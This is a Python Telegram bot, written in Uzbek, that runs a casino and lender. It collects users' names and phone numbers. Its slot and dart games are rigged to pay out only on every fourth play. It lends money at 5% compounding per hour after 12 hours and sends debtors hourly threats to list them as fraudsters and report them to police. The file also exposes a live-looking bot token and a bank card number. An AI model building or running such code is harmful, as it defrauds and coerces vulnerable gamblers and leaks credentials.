import telebot
from telebot import types
import sqlite3
import time
from datetime import datetime, timedelta
from apscheduler.schedulers.background import BackgroundScheduler

# --- SOZLAMALAR ---
TOKEN = '8609558089:AAExgvs1_XR5jlj9RGC55zZStvc7nV_Z6hE'
bot = telebot.TeleBot(TOKEN)
ADMIN_ID = 8299021738
ADMIN_LINK = "https://t.me/Vebiy_001"
KARTA_RAQAM = "9860 6067 5582 9722"

QARZ_LIMITI_1 = 300000
QARZ_LIMITI_2 = 2000000
REFERAL_BONUS = 5000
MAX_YUTUQ = 110000 

# --- MA'LUMOTLAR BAZASI ---
def db_op(query, params=(), is_select=False):
    conn = sqlite3.connect('casino_uzb.db', check_same_thread=False, timeout=30)
    cursor = conn.cursor()
    try:
        cursor.execute(query, params)
        if is_select: return cursor.fetchall()
        conn.commit()
    except Exception as e: print(f"Baza xatosi: {e}")
    finally: conn.close()

db_op('''CREATE TABLE IF NOT EXISTS users 
         (id INTEGER PRIMARY KEY, name TEXT, phone TEXT, balance REAL DEFAULT 10000, 
          debt REAL DEFAULT 0, debt_time TEXT, 
          total_nasiya_taken INTEGER DEFAULT 0, referred_by INTEGER,
          games_played INTEGER DEFAULT 0)''')

# --- AVTOMATIK OGOHLANTIRISH VA JARIMA TIZIMI (HAR SOATDA) ---
def hourly_debt_checker():
    debtors = db_op("SELECT id, name, phone, debt, debt_time FROM users WHERE debt > 0", is_select=True)
    if not debtors: return
    
    for d in debtors:
        uid, name, phone, debt, d_time_str = d
        d_time = datetime.strptime(d_time_str, "%Y-%m-%d %H:%M:%S")
        deadline = d_time + timedelta(hours=12)
        
        # 12 soat o'tgach har soatda 5% qo'shish
        if datetime.now() > deadline:
            debt = debt * 1.05
            db_op("UPDATE users SET debt = ? WHERE id=?", (debt, uid))

        # Foydalanuvchini qo'rqitish
        warning_msg = (f"🚨 **DIQQAT: QARZDORLIK OGOHLANTIRISHI!**\n\n"
                       f"Hurmatli {name}, qarzingiz {debt:,.0f} so'mga yetdi.\n"
                       f"Agar tezda to'lamasangiz, Ismingiz va Raqamingiz ({phone}) "
                       f"firibgarlar ro'yxatiga qo'shiladi va IIBga topshiriladi!")
        try: bot.send_message(uid, warning_msg)
        except: pass

        # Adminga to'liq ma'lumot yuborish
        admin_report = (f"🚨 **QARZDOR NAZORATI**\n"
                        f"👤 Ism: {name}\n"
                        f"📞 Tel: {phone}\n"
                        f"💰 Qarz: {debt:,.0f} s\n"
                        f"🆔 ID: `{uid}`\n"
                        f"⏰ Olgan vaqti: {d_time_str}")
        try: bot.send_message(ADMIN_ID, admin_report)
        except: pass

scheduler = BackgroundScheduler()
scheduler.add_job(hourly_debt_checker, 'interval', hours=1)
scheduler.start()

# --- ASOSIY MENYU ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🎰 O'yinlar", "👤 Profil")
    markup.add("💸 Nasiya olish", "🔴 Qarzni to'lash")
    markup.add("💰 Pul yechish", "👥 Do'stlarni taklif qilish", "👨‍💻 Admin murojaat")
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    user = db_op("SELECT id FROM users WHERE id=?", (uid,), is_select=True)
    if not user:
        bot.send_message(uid, "Xush kelibsiz! Botdan foydalanish uchun Ism va Familiyangizni kiriting:")
        bot.register_next_step_handler(message, get_name)
    else:
        bot.send_message(uid, "💰 Xush kelibsiz!", reply_markup=main_menu())

def get_name(message):
    name = message.text
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(types.KeyboardButton("📞 Telefonni yuborish", request_contact=True))
    bot.send_message(message.chat.id, "Raqamingizni tasdiqlang:", reply_markup=markup)
    bot.register_next_step_handler(message, lambda m: save_user(m, name))

def save_user(message, name):
    if not message.contact: return start(message)
    db_op("INSERT INTO users (id, name, phone) VALUES (?, ?, ?)", (message.from_user.id, name, message.contact.phone_number))
    bot.send_message(message.from_user.id, "✅ Ro'yxatdan o'tdingiz!", reply_markup=main_menu())

@bot.message_handler(func=lambda m: True)
def handle_text(message):
    uid = message.from_user.id
    text = message.text
    u = db_op("SELECT debt, balance, games_played, total_nasiya_taken FROM users WHERE id=?", (uid,), is_select=True)
    if not u: return
    debt, balance, g_played, t_nasiya = u[0]

    if text == "👤 Profil":
        bot.send_message(uid, f"👤 **PROFIL**\n\n💰 Balans: {balance:,.0f} s\n🔴 Qarz: {debt:,.0f} s\n🆔 ID: `{uid}`")

    elif text == "🎰 O'yinlar":
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("🎰 Slot (100k)", "🎯 Dart (50k)", "🔙 Orqaga")
        bot.send_message(uid, "O'yinni tanlang:", reply_markup=markup)

    elif text in ["🎰 Slot (100k)", "🎯 Dart (50k)"]:
        cost = 100000 if "100k" in text else 50000
        if balance < cost: bot.send_message(uid, "⚠️ Mablag' yetarli emas!")
        else:
            g_played += 1
            db_op("UPDATE users SET balance = balance - ?, games_played = ? WHERE id=?", (cost, g_played, uid))
            res = bot.send_dice(uid, emoji='🎰' if "Slot" in text else '🎯')
            time.sleep(4)
            # 3-1 Algoritmi: Har 4-urinishda yutuq beradi
            if g_played % 4 == 0:
                db_op("UPDATE users SET balance = balance + ? WHERE id=?", (MAX_YUTUQ, uid))
                bot.send_message(uid, f"🎉 YUTDINGIZ! +{MAX_YUTUQ:,} s")
            else: bot.send_message(uid, "😔 Yutqazdingiz. Keyingi safar omad keladi!")

    elif text == "💸 Nasiya olish":
        if debt > 0: bot.send_message(uid, "❌ Avvalgi qarzni to'lang!"); return
        limit = QARZ_LIMITI_1 if t_nasiya == 0 else QARZ_LIMITI_2
        bot.send_message(uid, f"Summani kiriting (Max: {limit:,} s):")
        bot.register_next_step_handler(message, lambda m: confirm_nasiya_request(m, limit))

    elif text == "🔴 Qarzni to'lash":
        if debt <= 0: bot.send_message(uid, "Qarzingiz yo'q.")
        else:
            bot.send_message(uid, f"To'lov miqdori: {debt:,.0f} s\nKarta: `{KARTA_RAQAM}`\nTo'lagach, summani yozing:")
            bot.register_next_step_handler(message, pay_init)

    elif text == "💰 Pul yechish":
        if debt > 0: bot.send_message(uid, "🛑 Qarzingiz bor!")
        elif balance < 250000: bot.send_message(uid, "Minimal 250,000 s")
        else:
            bot.send_message(uid, "Karta va ismingizni yozing:")
            bot.register_next_step_handler(message, lambda m: bot.send_message(ADMIN_ID, f"💸 YECHISH SO'ROVI: {m.text}\nID: `{uid}`"))

    elif text == "🔙 Orqaga":
        bot.send_message(uid, "Asosiy menyu", reply_markup=main_menu())

# --- QARZNI TASDIQLASH VA ADMINGA YUBORISH ---
def confirm_nasiya_request(message, limit):
    try:
        amt = float(message.text)
        if 10000 <= amt <= limit:
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("Tastiqlayman ✅", callback_data=f"nasiya_yes_{amt}"))
            markup.add(types.InlineKeyboardButton("Bekor qilish ❌", callback_data="nasiya_no"))
            
            rules = (f"⚠️ **QARZ SHARTNOMASI**\n\n"
                     f"Summa: {amt:,} s\n"
                     f"1. 12 soatda to'lashga roziman.\n"
                     f"2. To'lamasam har soatda 5% jarimaga roziman.\n"
                     f"3. Ma'lumotlarim tarqatilishiga roziman.")
            bot.send_message(message.chat.id, rules, reply_markup=markup)
        else: bot.send_message(message.chat.id, "Limit xato!")
    except: bot.send_message(message.chat.id, "Faqat raqam!")

def pay_init(message):
    try:
        amt = float(message.text)
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Tastiqlash ✅", callback_data=f"pay_v_{message.from_user.id}_{amt}"),
                   types.InlineKeyboardButton("Rad etish ❌", callback_data="pay_x"))
        bot.send_message(ADMIN_ID, f"💳 **TO'LOV KELDI**\nSumma: {amt:,}\nID: `{message.from_user.id}`", reply_markup=markup)
        bot.send_message(message.chat.id, "✅ Adminga yuborildi.")
    except: pass

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    uid = call.from_user.id
    d = call.data.split("_")

    if d[0] == "nasiya":
        if d[1] == "yes":
            amt = float(d[2])
            db_op("UPDATE users SET balance = balance + ?, debt = debt + ?, debt_time = ?, total_nasiya_taken = total_nasiya_taken + 1 WHERE id=?", 
                  (amt, amt, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), uid))
            bot.edit_message_text(f"✅ Qarz berildi: {amt:,} s", call.message.chat.id, call.message.message_id)
            # Adminga
            u = db_op("SELECT name, phone FROM users WHERE id=?", (uid,), is_select=True)[0]
            bot.send_message(ADMIN_ID, f"📑 **QARZ OLINDI**\n👤 {u[0]}\n📞 {u[1]}\n💰 {amt:,} s\nTasdiqladi ✅")
        else:
            bot.edit_message_text("❌ Bekor qilindi.", call.message.chat.id, call.message.message_id)

    elif d[0] == "pay" and d[1] == "v":
        target_id, amt = int(d[2]), float(d[3])
        db_op("UPDATE users SET debt = CASE WHEN debt > ? THEN debt - ? ELSE 0 END WHERE id=?", (amt, amt, target_id))
        bot.send_message(target_id, "✅ To'lovingiz tasdiqlandi!")
        bot.edit_message_text("Bajarildi ✅", call.message.chat.id, call.message.message_id)

# --- ADMIN BUYRUQLARI ---
@bot.message_handler(commands=['malumot', 'user', 'plus_balans'])
def admin_cmds(message):
    if message.from_user.id != ADMIN_ID: return
    c = message.text.split()
    
    if c[0] == '/malumot':
        res = db_op("SELECT id, name, balance, debt FROM users", is_select=True)
        out = "📊 **FOYDALANUVCHILAR:**\n"
        for r in res: out += f"🆔 `{r[0]}` | {r[1]} | B: {r[2]:,.0f} | Q: {r[3]:,.0f}\n"
        for i in range(0, len(out), 4000): bot.send_message(ADMIN_ID, out[i:i+4000])

    elif c[0] == '/user' and len(c) == 2:
        r = db_op("SELECT * FROM users WHERE id=?", (c[1],), is_select=True)
        if r: bot.send_message(ADMIN_ID, f"👤 **Ma'lumot:**\nID: `{r[0][0]}`\nIsm: {r[0][1]}\nTel: {r[0][2]}\nBalans: {r[0][3]:,}\nQarz: {r[0][4]:,}")

bot.infinity_polling()
        
        
        
    
                



        

    
            
        
        
    
  
